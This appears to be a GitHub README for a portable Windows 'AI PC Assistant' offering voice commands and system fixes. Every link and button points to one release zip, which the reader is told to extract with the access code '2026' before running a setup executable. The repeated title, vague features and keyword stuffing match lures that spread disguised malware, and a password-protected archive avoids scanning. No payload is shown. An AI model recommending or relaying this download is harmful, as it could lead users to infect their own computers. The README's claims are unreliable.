<div align="center">

# AI PC Assistant — AI PC Assistant — Ai Pc Assistant (Hot-Reload Config, Zero Dependencies)

<p><strong>AI PC Assistant — AI PC Assistant — Ai Pc Assistant (Hot-Reload Config, Zero Dependencies): AI PC Assistant — assistant and voice in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/computer-assistant-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/computer-assistant-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/computer-assistant-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/computer-assistant?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/computer-assistant-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download computer-assistant-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/computer-assistant-v0.1.0-win64.zip"><img src="banner.svg" alt="AI PC Assistant Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**AI PC Assistant — AI PC Assistant — assistant and voice in one tool** (`computer-assistant`) is a portable Windows 10/11 runtime suite: drop the prebuilt package, point it at `config/settings.json`, and go. No compiler, no external dependencies, live hot-reload included.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`computer-assistant-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/computer-assistant-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`computer-assistant-v0.1.0-win64.zip`](../../releases/download/v0.1.0/computer-assistant-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `ComputerAssistant_Setup_x64.exe` (keep `config/settings.json` in the same folder).

### FAQ

<details>
<summary><b>Voice?</b></summary>

Wake-word + commands.
</details>
<details>
<summary><b>What does it fix?</b></summary>

Junk, startup, lag, errors.
</details>
<details>
<summary><b>Cloud?</b></summary>

No — fully local.
</details>

### Configuration (`config/settings.json`)

```json
{
  "module": "computer-assistant",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "voice": {
      "enabled": true
    },
    "diag": {
      "enabled": true
    },
    "fixer": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

### Documentation & Guides

- [Usage Guide — commands and options](docs/USAGE.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)

### Engine Components

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Primary Subsystem** | Bounded ring-buffer pipeline with zero-copy handoff | `live toggle` |
| **State Engine** | Atomic JSON state with crash-safe rollback | `keep_state` |
| **Config Watcher** | Hot-reloadable settings, applied without restart | `hot_reload` |
| **Telemetry** | Compact stderr channel, silent by default | `quiet / --verbose` |

## Building from Source

```bash
git clone https://github.com/TestOwner/computer-assistant.git
cd computer-assistant
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: computer-assistant, pc, voice, diagnostics, fix, windows, helper, ai, assistant, cli, developer-tools, open-source, automation, productivity, cpp, portable, prebuilt, tools</sub>

## Keywords

ai assistant pc voice diagnostics fix windows helper pc-helper-ai computer-assistant ai-pc-assistant windows portable prebuilt x64 free download
related: ai, assistant, pc, voice, diagnostics, fix, windows, helper
